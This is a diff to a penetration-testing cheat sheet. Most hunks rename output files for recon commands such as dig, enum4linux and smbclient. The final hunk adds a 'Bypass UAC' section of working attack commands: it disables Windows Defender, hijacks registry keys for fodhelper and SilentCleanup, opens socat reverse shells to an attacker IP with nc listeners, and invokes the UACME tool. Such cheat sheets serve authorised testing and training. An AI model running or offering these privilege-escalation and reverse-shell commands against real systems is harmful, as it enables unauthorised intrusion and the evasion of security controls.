@@ -258,6 +258,7 @@ nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-pu
 ##### 📂 Script Categories
 
 Location: `/usr/share/nmap/scripts`
+- https://nmap.org/nsedoc/scripts/
 
 - **auth** - Scripts related to authentication, such as bypassing credentials or checking for default ones.
 - **broadcast** - Used to discover hosts on the local network by broadcasting requests.
@@ -392,9 +393,9 @@ ffuf -s -c -o ffuf_vhosts -w /usr/share/seclists/Discovery/DNS/subdomains-top1mi
 - DNSDumpster: https://dnsdumpster.com/
 
 ```bash
-whois <TARGET> > whois_$(date +%Y-%m-%d_%H%M).txt
+whois <TARGET> > whois.txt
 
-dig +short @<DNS_SERVER> <TARGET> <RECORD_TYPE> > dns_$(date +%Y-%m-%d_%H%M).txt
+dig +short @<DNS_SERVER> <TARGET> <RECORD_TYPE> > dns.txt
 # --- Record Types ---
 # ANY: return all records -- sometimes doesnt work!
 # A: IPv4 address
@@ -407,16 +408,16 @@ dig +short @<DNS_SERVER> <TARGET> <RECORD_TYPE> > dns_$(date +%Y-%m-%d_%H%M).txt
 # TXT: Text Records
 # SRV: Service Records
 # CAA: Certification Authority Authorization
-for type in A AAAA CNAME MX NS SOA SRV TXT ; do echo '---' ; dig +short $type <TARGET> >> dns_all_records_$(date +%Y-%m-%d_%H%M).txt ; done
+for type in A AAAA CNAME MX NS SOA SRV TXT ; do echo '---' ; dig +short $type <TARGET> >> dns_all_records.txt ; done
 
 # IP -> DNS
-dig -x <IP_ADDR> > dns_reverse_$(date +%Y-%m-%d_%H%M).txt
+dig -x <IP_ADDR> > dns_reverse.txt
 
 # RARE: DNS Zone Transfer
-dig axfr @<DNS_SERVER> <TARGET> > dns_zone_transfer_$(date +%Y-%m-%d_%H%M).txt
+dig axfr @<DNS_SERVER> <TARGET> > dns_zone_transfer.txt
 
 # RARE: older DNS query
-dig @<DNS_SERVER> +noedns +nocookie +norecurse <TARGET> > dns_legacy_$(date +%Y-%m-%d_%H%M).txt
+dig @<DNS_SERVER> +noedns +nocookie +norecurse <TARGET> > dns_legacy.txt
 # EDNS breaks on Win, norecurse usu for internal networks
 ```
 
@@ -442,10 +443,10 @@ get <FILENAME>
 
 ```bash
 # Perform a full enumeration of a target using enum4linux
-enum4linux -a <TARGET> > enum4linux_$(date +%Y-%m-%d_%H%M).txt
+enum4linux -a <TARGET> > enum4linux.txt
 
 # List available SMB shares without password
-smbclient -N --list <HOSTNAME> > smb_shares_$(date +%Y-%m-%d_%H%M).txt
+smbclient -N --list <HOSTNAME> > smb_shares.txt
 
 # Connect to an SMB share with a null session (no password)
 smbclient -N //<TARGET>/<SHARE>
@@ -466,7 +467,7 @@ sudo nmap -p 445 --script "smb-enum-domains,smb-os-discovery" -oA $(date +%Y-%m-
 sudo nmap -p 389 --script ldap-search --script-args 'ldap.search.base="",ldap.search.filter="(objectClass=*)",ldap.search.attributes="namingContexts"' -oA $(date +%Y-%m-%d_%H%M)_ldap_search <TARGET>
 
 # DNS / Start of Authority
-dig @<TARGET> SOA > dns_soa_$(date +%Y-%m-%d_%H%M).txt
+dig @<TARGET> SOA > dns_soa.txt
 ```
 
 ### 📂 SMB Administrative Shares
@@ -478,7 +479,7 @@ dig @<TARGET> SOA > dns_soa_$(date +%Y-%m-%d_%H%M).txt
 #### SMB Share Interaction
 ```bash
 # List shares anonymously
-smbclient -N -L //<TARGET_IP> > smb_list_$(date +%Y-%m-%d_%H%M).txt
+smbclient -N -L //<TARGET_IP> > smb_list.txt
 
 # Connect to a public share anonymously
 smbclient -N //<TARGET_IP>/Public
@@ -703,7 +704,7 @@ wpscan --password-attack wp-login --output wpscan_bruteforce.txt --passwords <PA
 #### 🌐 cURL
 ```bash
 # Fetch only the HTTP headers of a webpage
-curl -I <TARGET> > http_headers_$(date +%Y-%m-%d_%H%M).txt
+curl -I <TARGET> > http_headers.txt
 
 # Attempt to upload a file to a web server
 curl --upload-file <FILE> <TARGET>/<FILENAME>
@@ -808,7 +809,7 @@ The exploitation phase focuses on gaining initial access to target systems throu
 # Update Searchsploit
 searchsploit --update
 # Search
-searchsploit "<SERVICE_VERSION>" | grep -iE 'remote|rce|privilege|lpe|code execution|backdoor' | grep -vE 'dos|denial|poc' > searchsploit_$(date +%Y-%m-%d_%H%M).txt
+searchsploit "<SERVICE_VERSION>" | grep -iE 'remote|rce|privilege|lpe|code execution|backdoor' | grep -vE 'dos|denial|poc' > searchsploit.txt
 ```
 - https://nvd.nist.gov/vuln/search#/nvd/home
 
@@ -831,7 +832,7 @@ Crack hashes:
 man 5 crypt
 
 # Spotty: but IDs hashes
-hashid '$P$8ohUJ.1sdFw09/bMaAQPTGDNi2BIUt1' > hashid_$(date +%Y-%m-%d_%H%M).txt
+hashid '$P$8ohUJ.1sdFw09/bMaAQPTGDNi2BIUt1' > hashid.txt
 
 hash-identifier
 ```
@@ -2559,6 +2560,67 @@ Write-Host "Results saved to: $outputFile" -ForegroundColor Cyan
 
 # --- Stop logging ---
 Stop-Transcript
+```
+
+### Bypass UAC
+
+```bash
+# Enable WinDefend
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $false"
+
+# Disable WinDefend
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"
+
+---
+### These works when UAC is **NOT** "Always Notify"
+
+# msconfig
+WIN+R > msconfig > Tools > Select "Command Prompt" > Launch
+
+# azman.msc
+Help > Help Topics > Right-Click > View Source > Show "All Files" > Search and Select "cmd.exe" > Right-Click > Open
+
+# Fodhelper.exe w/ Socat
+nc -nvlp <PORT>
+
+set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<ATTACKER_IP>:<PORT> EXEC:cmd.exe,pipes"
+reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
+
+whoami /groups
+// success HIGH!
+
+reg delete HKCU\Software\Classes\ms-settings\ /f
+reg query %REG_KEY% /v ""
+
+# WinDefend-Safe UAC Bypass w/ Socat
+powershell.exe
+
+$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe <ATTACKER_IP>:<PORT> EXEC:cmd.exe,pipes"
+New-Item "HKCU:\Software\Classes\.update\Shell\Open\command" -Force
+Set-ItemProperty "HKCU:\Software\Classes\.update\Shell\Open\command" -Name "(default)" -Value $program -Force
+New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
+Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".update" -Force
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+// success!
+
+reg delete "HKCU\Software\Classes\.update\" /f
+reg delete "HKCU\Software\Classes\ms-settings\" /f
+
+# "Always Notify"-Safe UAC Bypass (but NOT WinDefend-Safe)
+nc -lvnp <PORT>
+           
+reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe <ATTACKER_IP>:<PORT> EXEC:cmd.exe,pipes &REM " /f
+schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+// success!
+
+reg delete "HKCU\Environment" /v "windir" /f
+
+# Auto-Bypass (up-to-date)
+# https://github.com/hfiref0x/UACME
+
+C:\tools\UACME-Akagi64.exe 33
 ```
 
 ## 🌱 Living Off the Land
